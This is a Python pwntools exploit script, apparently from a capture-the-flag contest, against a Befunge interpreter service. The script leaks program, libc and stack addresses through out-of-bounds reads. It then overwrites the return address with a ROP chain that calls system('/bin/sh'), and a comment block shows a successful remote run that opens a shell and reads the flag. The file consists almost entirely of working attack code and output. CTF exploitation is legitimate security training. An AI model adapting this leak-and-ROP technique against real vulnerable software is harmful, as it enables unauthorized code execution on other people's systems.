#!/usr/bin/env python

from pwn import *
import sys

'''
  befunge python ./befunge.py pwn1.chal.ctf.westerns.tokyo 62839
[*] For remote: ./befunge.py HOST PORT
[+] Opening connection to pwn1.chal.ctf.westerns.tokyo on port 62839: Done
[*] Program: 0x55dd2af45040
[*] Exit: 0x7fbb797de1e0
[*] Setvbuf: 0x7fbb798125a0
[*] Libc base: 0x7fbb797a2000
[*] Main base: 0x55dd2ad43000
[*] POP RDI  : 0x55dd2ad44273
[*] __environ: 0x7fbb79b634a0
[*] Offset_y : 0x85fa959fa7
[*] Offset_x : 0x30
[*] Stack: 0x7fffc30b4528
[*] Offset_y : 0x86d519e30c
[*] Offset_x : 0x38
[*] Ret: 0x7fbb797c3f45
[*] Return value overwritten
[*] Argument ptr to /bin/sh
[*] ret2system
[*] Switching to interactive mode
Too many steps. Is there any infinite loops?
$ ls
befunge
flag
$ cat flag
TWCTF{It_1s_eMerG3nCy}
Time out
[*] Got EOF while reading in interactive
$
'''


def exploit(r):
	r.recvuntil('> ')
	payload = ('&&g,&&g,&&g,&&g,&&g,&&g,' + '&&g,&&g,&&g,&&g,&&g,&&g,' + '&&g,&&g,&&g,&&g,&&g,&&g,').ljust(0x4f, "A") + 'v'
	r.sendline(payload)

	r.recvuntil('> ')
	payload = (('<&&&*&+g,&&&*&+g,&&&*&+g,&&&*&+g,&&&*&+g,&&&*&+g,').ljust(0x4f, "A")+'v')[::-1]
	r.sendline(payload)

	r.recvuntil('> ')
	payload = ('>&&&*&+g,&&&*&+g,&&&*&+g,&&&*&+g,&&&*&+g,&&&*&+g,').ljust(0x4f, "A") + 'v'
	r.sendline(payload)

	r.recvuntil('> ')
	payload = (('<&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p').ljust(0x4f, "A")+'v')[::-1]
	r.sendline(payload)

	r.recvuntil('> ')
	payload = ('>&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p').ljust(0x4f, "A") + 'v'
	r.sendline(payload)

	r.recvuntil('> ')
	payload = (('<&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p&&&&*&+p').ljust(0x4f, "A")+'v')[::-1]
	r.sendline(payload)

	r.recvuntil('> ')
	payload = '>v'
	r.sendline(payload)

	r.recvuntil('> ')
	payload = '^<'
	r.sendline(payload)


	for i in range(17):
		r.recvuntil('> ')
		r.send("\n")

	r.sendline('-16')
	r.sendline('-1')
	program_ptr = r.recv(1)
	r.sendline('-15')
	r.sendline('-1')
	program_ptr += r.recv(1)
	r.sendline('-14')
	r.sendline('-1')
	program_ptr += r.recv(1)
	r.sendline('-13')
	r.sendline('-1')
	program_ptr += r.recv(1)
	r.sendline('-12')
	r.sendline('-1')
	program_ptr += r.recv(1)
	r.sendline('-11')
	r.sendline('-1')
	program_ptr += r.recv(1)
	program_ptr += "\x00\x00"
	program_ptr = u64(program_ptr)
	log.info("Program: " + hex(program_ptr))
	r.sendline('-64')
	r.sendline('-1')
	exit_ptr = r.recv(1)
	r.sendline('-63')
	r.sendline('-1')
	exit_ptr += r.recv(1)
	r.sendline('-62')
	r.sendline('-1')
	exit_ptr += r.recv(1)
	r.sendline('-61')
	r.sendline('-1')
	exit_ptr += r.recv(1)
	r.sendline('-60')
	r.sendline('-1')
	exit_ptr += r.recv(1)
	r.sendline('-59')
	r.sendline('-1')
	exit_ptr += r.recv(1)
	exit_ptr += "\x00\x00"
	exit_ptr = u64(exit_ptr)
	log.info("Exit: " + hex(exit_ptr))
	r.sendline('-80')
	r.sendline('-1')
	setvbuf_ptr = r.recv(1)
	r.sendline('-79')
	r.sendline('-1')
	setvbuf_ptr += r.recv(1)
	r.sendline('-78')
	r.sendline('-1')
	setvbuf_ptr += r.recv(1)
	r.sendline('-77')
	r.sendline('-1')
	setvbuf_ptr += r.recv(1)
	r.sendline('-76')
	r.sendline('-1')
	setvbuf_ptr += r.recv(1)
	r.sendline('-75')
	r.sendline('-1')
	setvbuf_ptr += r.recv(1)
	setvbuf_ptr += "\x00\x00"
	setvbuf_ptr = u64(setvbuf_ptr)
	log.info("Setvbuf: " + hex(setvbuf_ptr))
	
	'''
	__environ 00000000003c14a0		local __environ 00000000003c5f98
	exit 000000000003c1e0			local exit 000000000003a020
	setvbuf 00000000000705a0		local setvbuf 000000000006fdb0
	system 0000000000046590			local system 0000000000045380
	offset_str_bin_sh = 0x17c8c3	local offset_str_bin_sh = 0x18c58b
	0x00001273: pop rdi ; ret

	'''
	main_module = program_ptr - 0x202040
	pop_rdi = main_module + 0x1273
	libc_base = exit_ptr - 0x3c1e0
	libc_system = libc_base + 0x46590
	libc_binsh = libc_base + 0x17c8c3
	__environ = libc_base + 0x3c14a0
	offset_y = (__environ - program_ptr) / 0x50
	offset_x = (__environ - program_ptr) % 0x50
	log.info("Libc base: " + hex(libc_base))
	log.info("Main base: " + hex(main_module))
	log.info("POP RDI  : " + hex(pop_rdi))
	log.info("__environ: " + hex(__environ))
	log.info("Offset_y : " + hex(offset_y))
	log.info("Offset_x : " + hex(offset_x))

	r.sendline(str(offset_x))
	r.sendline(str(offset_y / 0x1000))
	r.sendline(str(0x1000))
	r.sendline(str(offset_y % 0x1000))
	stack = r.recv(1)
	r.sendline(str(offset_x+1))
	r.sendline(str(offset_y / 0x1000))
	r.sendline(str(0x1000))
	r.sendline(str(offset_y % 0x1000))
	stack += r.recv(1)
	r.sendline(str(offset_x+2))
	r.sendline(str(offset_y / 0x1000))
	r.sendline(str(0x1000))
	r.sendline(str(offset_y % 0x1000))
	stack += r.recv(1)
	r.sendline(str(offset_x+3))
	r.sendline(str(offset_y / 0x1000))
	r.sendline(str(0x1000))
	r.sendline(str(offset_y % 0x1000))
	stack += r.recv(1)
	r.sendline(str(offset_x+4))
	r.sendline(str(offset_y / 0x1000))
	r.sendline(str(0x1000))
	r.sendline(str(offset_y % 0x1000))
	stack += r.recv(1)
	r.sendline(str(offset_x+5))
	r.sendline(str(offset_y / 0x1000))
	r.sendline(str(0x1000))
	r.sendline(str(offset_y % 0x1000))
	stack += r.recv(1)
	stack += "\x00\x00"
	stack = u64(stack)
	log.info("Stack: " + hex(stack))

	ret_addr = stack - 0xf0	# maybe 0x128
	offset_y = (ret_addr - program_ptr) / 0x50
	offset_x = (ret_addr - program_ptr) % 0x50
	log.info("Offset_y : " + hex(offset_y))
	log.info("Offset_x : " + hex(offset_x))

	r.sendline(str(offset_x))
	r.sendline(str(offset_y / 0x1000))
	r.sendline(str(0x1000))
	r.sendline(str(offset_y % 0x1000))
	ret = r.recv(1)
	r.sendline(str(offset_x+1))
	r.sendline(str(offset_y / 0x1000))
	r.sendline(str(0x1000))
	r.sendline(str(offset_y % 0x1000))
	ret += r.recv(1)
	r.sendline(str(offset_x+2))
	r.sendline(str(offset_y / 0x1000))
	r.sendline(str(0x1000))
	r.sendline(str(offset_y % 0x1000))
	ret += r.recv(1)
	r.sendline(str(offset_x+3))
	r.sendline(str(offset_y / 0x1000))
	r.sendline(str(0x1000))
	r.sendline(str(offset_y % 0x1000))
	ret += r.recv(1)
	r.sendline(str(offset_x+4))
	r.sendline(str(offset_y / 0x1000))
	r.sendline(str(0x1000))
	r.sendline(str(offset_y % 0x1000))
	ret += r.recv(1)
	r.sendline(str(offset_x+5))
	r.sendline(str(offset_y / 0x1000))
	r.sendline(str(0x1000))
	r.sendline(str(offset_y % 0x1000))
	ret += r.recv(1)
	ret += "\x00\x00"
	ret = u64(ret)
	log.info("Ret: " + hex(ret))

	pop_rdi = p64(pop_rdi)
	r.sendline(str(ord(pop_rdi[0])))
	r.sendline(str(offset_x))
	r.sendline(str(offset_y / 0x1000))
	r.sendline(str(0x1000))
	r.sendline(str(offset_y % 0x1000))

	r.sendline(str(ord(pop_rdi[1])))
	r.sendline(str(offset_x+1))
	r.sendline(str(offset_y / 0x1000))
	r.sendline(str(0x1000))
	r.sendline(str(offset_y % 0x1000))

	r.sendline(str(ord(pop_rdi[2])))
	r.sendline(str(offset_x+2))
	r.sendline(str(offset_y / 0x1000))
	r.sendline(str(0x1000))
	r.sendline(str(offset_y % 0x1000))

	r.sendline(str(ord(pop_rdi[3])))
	r.sendline(str(offset_x+3))
	r.sendline(str(offset_y / 0x1000))
	r.sendline(str(0x1000))
	r.sendline(str(offset_y % 0x1000))

	r.sendline(str(ord(pop_rdi[4])))
	r.sendline(str(offset_x+4))
	r.sendline(str(offset_y / 0x1000))
	r.sendline(str(0x1000))
	r.sendline(str(offset_y % 0x1000))

	r.sendline(str(ord(pop_rdi[5])))
	r.sendline(str(offset_x+5))
	r.sendline(str(offset_y / 0x1000))
	r.sendline(str(0x1000))
	r.sendline(str(offset_y % 0x1000))
	log.info("Return value overwritten")


	libc_binsh = p64(libc_binsh)
	r.sendline(str(ord(libc_binsh[0])))
	r.sendline(str(offset_x+8))
	r.sendline(str(offset_y / 0x1000))
	r.sendline(str(0x1000))
	r.sendline(str(offset_y % 0x1000))

	r.sendline(str(ord(libc_binsh[1])))
	r.sendline(str(offset_x+1+8))
	r.sendline(str(offset_y / 0x1000))
	r.sendline(str(0x1000))
	r.sendline(str(offset_y % 0x1000))

	r.sendline(str(ord(libc_binsh[2])))
	r.sendline(str(offset_x+2+8))
	r.sendline(str(offset_y / 0x1000))
	r.sendline(str(0x1000))
	r.sendline(str(offset_y % 0x1000))

	r.sendline(str(ord(libc_binsh[3])))
	r.sendline(str(offset_x+3+8))
	r.sendline(str(offset_y / 0x1000))
	r.sendline(str(0x1000))
	r.sendline(str(offset_y % 0x1000))

	r.sendline(str(ord(libc_binsh[4])))
	r.sendline(str(offset_x+4+8))
	r.sendline(str(offset_y / 0x1000))
	r.sendline(str(0x1000))
	r.sendline(str(offset_y % 0x1000))

	r.sendline(str(ord(libc_binsh[5])))
	r.sendline(str(offset_x+5+8))
	r.sendline(str(offset_y / 0x1000))
	r.sendline(str(0x1000))
	r.sendline(str(offset_y % 0x1000))
	log.info("Argument ptr to /bin/sh")

	libc_system = p64(libc_system)
	r.sendline(str(ord(libc_system[0])))
	r.sendline(str(offset_x+8+8))
	r.sendline(str(offset_y / 0x1000))
	r.sendline(str(0x1000))
	r.sendline(str(offset_y % 0x1000))

	r.sendline(str(ord(libc_system[1])))
	r.sendline(str(offset_x+1+8+8))
	r.sendline(str(offset_y / 0x1000))
	r.sendline(str(0x1000))
	r.sendline(str(offset_y % 0x1000))

	r.sendline(str(ord(libc_system[2])))
	r.sendline(str(offset_x+2+8+8))
	r.sendline(str(offset_y / 0x1000))
	r.sendline(str(0x1000))
	r.sendline(str(offset_y % 0x1000))

	r.sendline(str(ord(libc_system[3])))
	r.sendline(str(offset_x+3+8+8))
	r.sendline(str(offset_y / 0x1000))
	r.sendline(str(0x1000))
	r.sendline(str(offset_y % 0x1000))

	r.sendline(str(ord(libc_system[4])))
	r.sendline(str(offset_x+4+8+8))
	r.sendline(str(offset_y / 0x1000))
	r.sendline(str(0x1000))
	r.sendline(str(offset_y % 0x1000))

	r.sendline(str(ord(libc_system[5])))
	r.sendline(str(offset_x+5+8+8))
	r.sendline(str(offset_y / 0x1000))
	r.sendline(str(0x1000))
	r.sendline(str(offset_y % 0x1000))
	log.info("ret2system")

	r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/mma/interpreter/befunge/befunge'])
        print util.proc.pidof(r)
        pause()
        exploit(r)